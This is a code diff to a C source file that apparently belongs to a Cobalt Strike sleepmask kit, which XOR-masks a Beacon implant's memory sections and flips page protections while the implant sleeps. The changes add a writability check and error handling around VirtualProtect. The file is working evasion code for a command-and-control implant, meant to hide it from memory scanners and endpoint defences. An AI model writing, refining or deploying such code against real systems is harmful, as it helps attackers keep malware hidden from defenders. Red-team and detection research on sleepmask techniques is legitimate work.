@@ -1,10 +1,13 @@
 #include <windows.h>
 
-#include "../beacon.h"
-#include "../base/helpers.h"
-#include "../debug.h"
-#include "../sleepmask.h"
-#include "../sleepmask-vs.h"
+// Include bof-vs header files
+#include "beacon.h"
+#include "helpers.h"
+#include "sleepmask.h"
+
+// Include sleepmask-vs specific header files
+#include "..\debug.h"
+#include "..\sleepmask-vs.h"
 
 /**
 * Mask Beacon
@@ -24,7 +27,7 @@ void MaskBeacon(BEACON_INFO* beaconInfo) {
 */
 void UnMaskBeacon(BEACON_INFO* beaconInfo) {
     XORBeacon(beaconInfo, FALSE);
-    
+ 
     return;
 }
 
@@ -49,15 +52,33 @@ void XORBeacon(BEACON_INFO* beaconInfo, BOOL mask) {
     return;
 }
 
+/*
+* Check if memory protection is writable
+* @param dwProtection The current memory protection constant
+* @return A Boolean value to indicate it is writable
+*/
+BOOL IsWritable(DWORD dwProtection) {
+    if (dwProtection == PAGE_EXECUTE_READWRITE
+        || dwProtection == PAGE_EXECUTE_WRITECOPY
+        || dwProtection == PAGE_READWRITE
+        || dwProtection == PAGE_WRITECOPY
+        ) {
+        return TRUE;
+    }
+    return FALSE;
+}
+
 /**
 * XOR the sections in the provided memory region
-* 
+*
 * @param allocatedRegion A pointer to a ALLOCATED_MEMORY_REGION structure
 * @param maskKey A pointer to the mask key
 * @param mask A Boolean value to indicate whether the function is masking/unmasking
 */
 void XORSections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL mask) {
     DFR_LOCAL(KERNEL32, VirtualProtect);
+    DWORD oldProtection = 0;
+
     for (int i = 0; i < sizeof(allocatedRegion->Sections) / sizeof(ALLOCATED_MEMORY_SECTION); i++) {
         // Check we have a valid base address
         char* baseAddress = (char*)allocatedRegion->Sections[i].BaseAddress;
@@ -65,26 +86,39 @@ void XORSections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL m
             // Keep searching for a valid section
             continue;
         }
+
         DLOGF("SLEEPMASK: %s Section - Address: %p\n", mask ? "Masking" : "Unmasking", allocatedRegion->Sections[i].BaseAddress);
         if (allocatedRegion->Sections[i].MaskSection == TRUE) {
             // Change protections on any RX regions if masking
             if (allocatedRegion->Sections[i].CurrentProtect == PAGE_EXECUTE_READ && mask == TRUE) {
-                VirtualProtect(baseAddress, allocatedRegion->Sections[i].VirtualSize, PAGE_READWRITE, &allocatedRegion->Sections[i].PreviousProtect);
+                oldProtection = 0;
+                if (!VirtualProtect(baseAddress, allocatedRegion->Sections[i].VirtualSize, PAGE_READWRITE, &oldProtection)) {
+                    DLOG("Failed to change protection from RX to RW turning MaskSection to FALSE, go to next section.\n");
+                    allocatedRegion->Sections[i].MaskSection = FALSE;
+                    continue;
+                }
                 allocatedRegion->Sections[i].CurrentProtect = PAGE_READWRITE;
+                allocatedRegion->Sections[i].PreviousProtect = oldProtection;
             }
 
-            // Mask the section
-            XORData((char*)baseAddress, allocatedRegion->Sections[i].VirtualSize, maskKey, MASK_SIZE);
+            // Mask the section, if section has WRITE permissions
+            if (IsWritable(allocatedRegion->Sections[i].CurrentProtect)) {
+                XORData((char*)baseAddress, allocatedRegion->Sections[i].VirtualSize, maskKey, MASK_SIZE);
+            }
 
             // Restore original protections when unmasking
             if (allocatedRegion->Sections[i].PreviousProtect != allocatedRegion->Sections[i].CurrentProtect && mask == FALSE) {
+                oldProtection = 0;
+                if (!VirtualProtect(baseAddress, allocatedRegion->Sections[i].VirtualSize, allocatedRegion->Sections[i].PreviousProtect, &oldProtection)) {
+                    DLOG("Failed to restore oiginal protection on virtual memory, crash is likely.\n");
+                    continue;
+                }
                 allocatedRegion->Sections[i].CurrentProtect = allocatedRegion->Sections[i].PreviousProtect;
-                VirtualProtect(baseAddress, allocatedRegion->Sections[i].VirtualSize, allocatedRegion->Sections[i].PreviousProtect, &allocatedRegion->Sections[i].PreviousProtect);
-                
+                allocatedRegion->Sections[i].PreviousProtect = oldProtection;
             }
         }
     }
-        
+
     return;
 }
 
@@ -122,3 +156,4 @@ BOOL XORData(char* buffer, size_t size, char* key, size_t keyLength) {
     }
     return TRUE;
 }
+
